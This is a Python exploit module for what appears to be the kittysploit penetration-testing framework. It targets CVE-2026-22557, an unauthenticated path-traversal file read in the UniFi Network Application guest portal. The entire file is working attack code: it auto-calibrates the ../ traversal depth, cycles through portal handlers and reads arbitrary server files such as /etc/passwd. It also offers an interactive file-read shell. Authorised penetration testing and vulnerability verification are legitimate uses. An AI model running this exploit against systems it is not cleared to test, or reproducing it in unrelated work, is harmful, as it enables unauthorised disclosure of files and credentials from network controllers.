#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-22557 — UniFi guest-portal unauthenticated file read via page_error."""

from typing import Optional
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        "name": "UniFi Network Application CVE-2026-22557 — path traversal file read",
        "description": (
            "Exploits CVE-2026-22557: unauthenticated arbitrary file read through the "
            "guest portal page_error parameter on /guest/s/<site>/wechat/sign (and "
            "/login). Uses lib.protocols.http.lfi for one-shot reads or an interactive "
            "LFI shell. Pair with scanner/http/unifi_cve_2026_22557. Note: full OS file "
            "disclosure typically requires portal_customized=true on the probed site."
        ),
        "author": ["Bishop Fox", "KittySploit Team"],
        "cve": "CVE-2026-22557",
        "platform": Platform.LINUX,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-22557",
            "https://community.ui.com/releases/Security-Advisory-Bulletin-062-062/c29719c0-405e-4d4a-8f26-e343e99f931b",
            "https://bishopfox.com/blog/looting-unifi-controllers-detecting-and-weaponizing-cve-2026-22557",
            "https://github.com/BishopFox/CVE-2026-22557-check",
        ],
        "tags": [
            "unifi",
            "ubiquiti",
            "path-traversal",
            "lfi",
            "guest-portal",
            "cve-2026-22557",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 10,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.2,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["unifi", "ubiquiti"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/guest/"],
                "param_any": ["page_error"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "file_read", "from_detail": "lfi_path"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(8443, "UniFi Network Application port (8443/8843/8880)", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)
    site = OptString("default", "UniFi site slug", required=False)
    endpoint = OptString(
        "wechat/sign",
        "Guest portal handler under /guest/s/<site>/ (wechat/sign or login)",
        required=False,
    )
    depth = OptInteger(
        0,
        "Fixed ../ depth (0 = auto-calibrate with system.properties)",
        required=False,
        advanced=True,
    )
    max_depth = OptInteger(8, "Max ../ depth when auto-calibrating", required=False, advanced=True)
    max_output = OptInteger(65536, "Max characters printed for a single read (0 = full)", required=False, advanced=True)
    verify_first = OptBool(True, "Calibrate traversal before reading", required=False)

    # Safer default than /etc/passwd: confirms bug without dumping creds by default.
    file_read = OptString(
        "firmware.json",
        "Relative path for page_error (or absolute like /etc/passwd)",
        required=True,
    )

    def __init__(self, framework=None):
        super().__init__(framework)
        self._calibrated_depth: Optional[int] = None
        self._working_endpoint: Optional[str] = None

    def _timeout(self) -> int:
        return max(int(self.timeout or 10), 10)

    def _site(self) -> str:
        return str(self.site or "default").strip() or "default"

    def _guest_base(self) -> str:
        return f"/guest/s/{self._site()}"

    def _handler_candidates(self) -> list:
        preferred = str(self.endpoint or "wechat/sign").strip().lstrip("/")
        handlers = [preferred]
        for alt in ("wechat/sign", "login"):
            if alt not in handlers:
                handlers.append(alt)
        return handlers

    def _is_html(self, body: str) -> bool:
        lower = (body or "")[:4000].lower()
        return any(m in lower for m in ("<html", "<!doctype", "<head", "<body"))

    def _looks_like_properties(self, body: str) -> bool:
        if not body or len(body) < 12 or self._is_html(body):
            return False
        lower = body.lower()
        if any(m in lower for m in ("is_default=", "unifi.", "inform_url", "uuid=", "portal.")):
            return True
        lines = [
            line
            for line in body.splitlines()
            if "=" in line and not line.lstrip().startswith(("<", "#"))
        ]
        return len(lines) >= 2

    def _page_error_get(self, handler: str, page_error: str):
        encoded = quote(page_error, safe="/.")
        path = f"{self._guest_base()}/{handler}?page_error={encoded}"
        referer = (
            f"{self._guest_base()}/?id=aa:bb:cc:dd:ee:ff&ap=00:11:22:33:44:55"
            f"&ssid=test&url=http://example.com"
        )
        return self.http_request(
            method="GET",
            path=path,
            headers={"Referer": referer},
            timeout=self._timeout(),
            allow_redirects=True,
        )

    def _calibrate(self) -> Optional[int]:
        fixed = int(self.depth or 0)
        if fixed > 0:
            self._calibrated_depth = fixed
            self._working_endpoint = self._handler_candidates()[0]
            return fixed

        max_depth = max(1, min(int(self.max_depth or 8), 16))
        for depth in range(1, max_depth + 1):
            target = f"{'../' * depth}system.properties"
            for handler in self._handler_candidates():
                response = self._page_error_get(handler, target)
                if not response or response.status_code != 200:
                    continue
                if self._looks_like_properties(response.text or ""):
                    self._calibrated_depth = depth
                    self._working_endpoint = handler
                    return depth
        return None

    def _build_page_error(self, file_path: str, depth: int) -> str:
        raw = (file_path or "").strip()
        if not raw:
            return ""
        # Absolute OS path: strip leading slash and prepend traversal.
        if raw.startswith("/"):
            return f"{'../' * max(1, depth)}{raw.lstrip('/')}"
        # Already a relative traversal / portal-relative path.
        if raw.startswith("../") or raw.startswith("..\\"):
            return raw
        return f"{'../' * max(1, depth)}{raw.lstrip('/')}"

    def _truncate(self, body: str) -> str:
        try:
            limit = int(self.max_output)
        except (TypeError, ValueError):
            limit = 65536
        if limit > 0 and len(body) > limit:
            print_warning(f"Truncated output to {limit} chars (max_output)")
            return body[:limit]
        return body

    def execute(self, file_path: str) -> str:
        path = (file_path or "").strip()
        if not path:
            return ""

        depth = self._calibrated_depth
        if depth is None:
            depth = self._calibrate()
        if depth is None:
            print_error("Failed to calibrate page_error traversal depth")
            return ""

        handler = self._working_endpoint or self._handler_candidates()[0]
        candidates = []

        # Prefer calibrated depth, then nearby depths for absolute paths.
        depths = [depth]
        if path.startswith("/"):
            for extra in range(1, max(1, int(self.max_depth or 8)) + 4):
                if extra not in depths:
                    depths.append(extra)

        for d in depths:
            page_error = self._build_page_error(path, d)
            if not page_error:
                continue
            for h in ([handler] + [x for x in self._handler_candidates() if x != handler]):
                candidates.append((h, page_error, d))

        seen = set()
        for handler_name, page_error, used_depth in candidates:
            key = (handler_name, page_error)
            if key in seen:
                continue
            seen.add(key)
            response = self._page_error_get(handler_name, page_error)
            if not response or response.status_code != 200:
                continue
            body = response.text or ""
            if not body or self._is_html(body):
                continue
            self._calibrated_depth = used_depth
            self._working_endpoint = handler_name
            return self._truncate(body)
        return ""

    def check(self):
        try:
            depth = self._calibrate()
            if depth is None:
                return {
                    "vulnerable": False,
                    "reason": "page_error traversal did not fire (patched or not exposed)",
                    "confidence": "medium",
                }
            body = self.execute("firmware.json")
            if body and not self._is_html(body):
                return {
                    "vulnerable": True,
                    "reason": f"Unauthenticated file read confirmed (depth={depth})",
                    "confidence": "high",
                }
            # Traversal fires (classpath branch) even without firmware.json.
            props = self.execute("system.properties")
            if props and self._looks_like_properties(props):
                return {
                    "vulnerable": True,
                    "reason": (
                        f"Traversal active at depth={depth} (classpath/partial; "
                        "firmware.json not readable on this site)"
                    ),
                    "confidence": "medium",
                }
            return {
                "vulnerable": False,
                "reason": "Calibration hit but follow-up reads failed",
                "confidence": "low",
            }
        except Exception as exc:
            return {"vulnerable": False, "reason": str(exc), "confidence": "low"}

    def run(self):
        print_info(
            f"Target: {self.target}:{self.port} — CVE-2026-22557 UniFi page_error LFI "
            f"(site={self._site()})"
        )

        if self.verify_first:
            print_status("Calibrating traversal depth via system.properties...")
            depth = self._calibrate()
            if depth is None:
                print_error("Traversal calibration failed — target likely patched or portal unreachable")
                return False
            print_success(
                f"Traversal active at depth={depth} via "
                f"{self._guest_base()}/{self._working_endpoint}"
            )

        if self.shell_lfi:
            print_status("Starting LFI handler (shell_lfi true)")
        else:
            print_info(f"Single read via Lfi.handler_lfi (file_read={self.file_read})")

        self.handler_lfi()
        return True
